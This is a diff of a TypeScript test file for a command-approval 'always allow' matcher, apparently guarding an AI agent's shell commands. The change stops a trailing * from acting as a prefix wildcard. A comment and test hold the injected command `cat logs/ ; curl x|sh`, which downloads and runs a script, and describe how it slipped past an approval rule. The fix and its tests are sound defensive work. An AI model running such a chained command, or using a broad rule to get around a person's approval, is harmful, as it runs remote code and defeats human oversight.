@@ -59,28 +59,28 @@ describe('matching "always allow" rules', () => {
     expect(matchesRule('npm test --watch', 'npm test')).toBe(false)
   })
 
-  it('supports the * pattern', () => {
-    expect(matchesRule('npm test --watch', 'npm test*')).toBe(true)
-    expect(matchesRule('npm install', 'npm test*')).toBe(false)
-  })
-
-  it('* spans line breaks, as the host prefix match does — a heredoc commit matches git commit*', () => {
-    const heredoc = "git commit -m \"$(cat <<'EOF'\nfix: a thing\n\nbody\nEOF\n)\""
-    expect(matchesRule(heredoc, 'git commit*')).toBe(true)
-    expect(matchesRule('git commit -m "one\ntwo"', 'git commit*')).toBe(true)
-    expect(previewMatches('git commit*', [heredoc])).toEqual([heredoc])
-    // Still anchored: a line break does not let the prefix match somewhere in the middle
-    expect(matchesRule('echo hi\ngit commit -m x', 'git commit*')).toBe(false)
-  })
-
   /*
-   * The host lets a rule through only by a trailing * (adapters/always-allow.ts). A * anywhere else used to widen the
-   * preview here while the host still asked: the preview said a command was covered that the host did not cover (#428).
+   * A `*` is no wildcard (#838). The matcher is the whole command the person approved, so a command that ends in `*`
+   * became a prefix rule: "always" on `cat logs/*` let `cat logs/ ; curl x|sh` run with no card, saved per project.
    */
-  it('* is a wildcard only at the end, as the host matches — elsewhere it is a literal *', () => {
+  it('a trailing * is no wildcard — a rule cat logs/* does not cover what starts with cat logs/', () => {
+    expect(matchesRule('cat logs/ ; curl x|sh', 'cat logs/*')).toBe(false)
+    expect(matchesRule('npm test --watch', 'npm test*')).toBe(false)
+    expect(matchesRule('git commit -m "one\ntwo"', 'git commit*')).toBe(false)
+    // Nor the command itself: it has no key, so an older build's rule for it allows nothing
+    expect(previewMatches('cat logs/*', ['cat logs/*', 'cat logs/a', 'cat logs/ ; curl x|sh'])).toEqual([])
+  })
+
+  // An older host reads a trailing * as a prefix and may serve the same store during a swap, so none is suggested (#838)
+  it('suggests no rule for a command ending in *', () => {
+    expect(suggestMatcher('cat logs/*')).toBe('')
+    expect(suggestMatcher(' rm build/* ')).toBe('')
+    expect(suggestMatcher('ls *.ts | wc -l')).toBe('ls *.ts | wc -l')
+  })
+
+  it('* elsewhere is a literal * too', () => {
     expect(matchesRule('git push --force origin', 'git * origin')).toBe(false)
     expect(matchesRule('git * origin', 'git * origin')).toBe(true)
-    expect(previewMatches('git * origin', ['git push origin', 'git * origin'])).toEqual(['git * origin'])
   })
 
   // The rule the card suggests for a command must match that command (#428): suggestMatcher trims, and the match did not
@@ -96,19 +96,19 @@ describe('matching "always allow" rules', () => {
   })
 
   it('a session rule does not apply to another session', () => {
-    const rules = [{ scope: 'session' as const, sessionId: 's1', matcher: 'npm*' }]
+    const rules = [{ scope: 'session' as const, sessionId: 's1', matcher: 'npm test' }]
     expect(findMatchingRule(cmd('npm test'), rules, { sessionId: 's1', projectId: 'p1' })).not.toBeNull()
     expect(findMatchingRule(cmd('npm test'), rules, { sessionId: 's2', projectId: 'p1' })).toBeNull()
   })
 
   it('a project rule applies to every session in that project', () => {
-    const rules = [{ scope: 'project' as const, projectId: 'p1', matcher: 'npm*' }]
+    const rules = [{ scope: 'project' as const, projectId: 'p1', matcher: 'npm test' }]
     expect(findMatchingRule(cmd('npm test'), rules, { sessionId: 'sX', projectId: 'p1' })).not.toBeNull()
     expect(findMatchingRule(cmd('npm test'), rules, { sessionId: 'sX', projectId: 'p2' })).toBeNull()
   })
 
   it('command rules do not apply to file edits', () => {
-    const rules = [{ scope: 'session' as const, sessionId: 's1', matcher: '*' }]
+    const rules = [{ scope: 'session' as const, sessionId: 's1', matcher: 'a.ts' }]
     const detail: ApprovalDetail = { kind: 'file_edit', path: 'a.ts', diffPreview: '', multi: false }
     expect(findMatchingRule(detail, rules, { sessionId: 's1', projectId: 'p1' })).toBeNull()
   })
@@ -117,7 +117,7 @@ describe('matching "always allow" rules', () => {
 describe('rule preview (making the result visible instead of limiting what can be expressed)', () => {
   it('shows the matching commands from the history', () => {
     const history = ['npm test', 'npm test:watch', 'npm install', 'npm test']
-    expect(previewMatches('npm test*', history)).toEqual(['npm test', 'npm test:watch'])
+    expect(previewMatches('npm test', history)).toEqual(['npm test'])
   })
 
   it('the suggestion is pinned to the whole approved command — widening it is up to the user', () => {
